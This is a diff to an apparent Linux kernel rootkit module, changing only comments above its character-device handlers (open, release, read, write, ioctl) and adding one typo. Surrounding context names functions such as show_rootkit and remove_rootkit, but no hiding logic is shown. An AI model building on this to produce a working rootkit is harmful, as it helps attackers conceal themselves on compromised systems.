@@ -130,7 +130,7 @@ static void show_rootkit(void)
         //sys_module_show_rootkit();
 }
 
-// ============= This function will be called when we open the Device file ============
+// ============= This function will be called when we open the Character Device file ============
 
 static int etx_open(struct inode *inode, struct file *file)
 {
@@ -138,7 +138,7 @@ static int etx_open(struct inode *inode, struct file *file)
         return 0;
 }
 
-// ============== This function will be called when we close the Device file ===========
+// ============== This function will be called when we close the Character Device file ===========
 
 static int etx_release(struct inode *inode, struct file *file)
 {
@@ -146,7 +146,7 @@ static int etx_release(struct inode *inode, struct file *file)
         return 0;
 }
 
-// === This function will be called when when somebody tries to read the Device file =====
+// === This function will be called when somebody tries to read the Character Device file =====
 
 static ssize_t etx_read(struct file *filp, char __user *buf, size_t len, loff_t *off)
 {
@@ -154,7 +154,7 @@ static ssize_t etx_read(struct file *filp, char __user *buf, size_t len, loff_t 
         return 0;
 }
 
-// ===== This function will be called when somebody tries to write into the Device file ===
+// ===== This function will be called when somebody tries to write into the Character Device file ===
 
 static ssize_t etx_write(struct file *filp, const char __user *buf, size_t len, loff_t *off)
 {
@@ -204,7 +204,7 @@ static void remove_rootkit(void)
 	}
 }
 
-// ======= This function will be called when somebody write IOCTL on the Device file =====
+// ======= This function will be called when somebody perfroms IOCTL onto the Character  Device file =====
 
 static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
